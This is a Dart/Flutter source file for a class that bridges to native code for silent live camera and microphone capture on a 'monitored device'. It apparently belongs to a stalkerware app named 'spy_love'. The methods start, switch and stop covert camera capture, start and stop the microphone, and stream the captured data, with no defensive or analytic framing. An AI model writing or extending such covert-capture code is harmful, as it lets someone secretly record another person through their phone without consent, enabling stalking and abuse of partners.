import 'dart:async';

import 'package:flutter/services.dart';

/// Native bridge for silent camera / mic capture on the monitored device.
class LiveAvBridge {
  LiveAvBridge._();

  static const _channel = MethodChannel('org.hmg.spy_love/monitoring');
  static const _events = EventChannel('org.hmg.spy_love/live_av');

  static StreamController<Map<String, dynamic>>? _controller;
  static StreamSubscription<dynamic>? _sub;

  static Stream<Map<String, dynamic>> get events {
    final existing = _controller;
    if (existing != null && !existing.isClosed) return existing.stream;
    final c = StreamController<Map<String, dynamic>>.broadcast(
      onListen: () {
        _sub ??= _events.receiveBroadcastStream().listen((event) {
          if (event is Map) {
            _controller?.add(Map<String, dynamic>.from(event));
          }
        });
      },
      onCancel: () {
        unawaited(_sub?.cancel());
        _sub = null;
      },
    );
    _controller = c;
    return c.stream;
  }

  static Future<bool> startCamera({String facing = 'back'}) async {
    try {
      return await _channel.invokeMethod<bool>('startLiveCamera', {
            'facing': facing,
          }) ??
          false;
    } on PlatformException {
      return false;
    } on MissingPluginException {
      return false;
    }
  }

  static Future<bool> switchCamera(String facing) async {
    try {
      return await _channel.invokeMethod<bool>('switchLiveCamera', {
            'facing': facing,
          }) ??
          false;
    } on PlatformException {
      return false;
    } on MissingPluginException {
      return false;
    }
  }

  static Future<void> stopCamera() async {
    try {
      await _channel.invokeMethod<void>('stopLiveCamera');
    } on PlatformException {
      // ignored
    } on MissingPluginException {
      // ignored
    }
  }

  static Future<bool> startMic() async {
    try {
      return await _channel.invokeMethod<bool>('startLiveMic') ?? false;
    } on PlatformException {
      return false;
    } on MissingPluginException {
      return false;
    }
  }

  static Future<void> stopMic() async {
    try {
      await _channel.invokeMethod<void>('stopLiveMic');
    } on PlatformException {
      // ignored
    } on MissingPluginException {
      // ignored
    }
  }
}
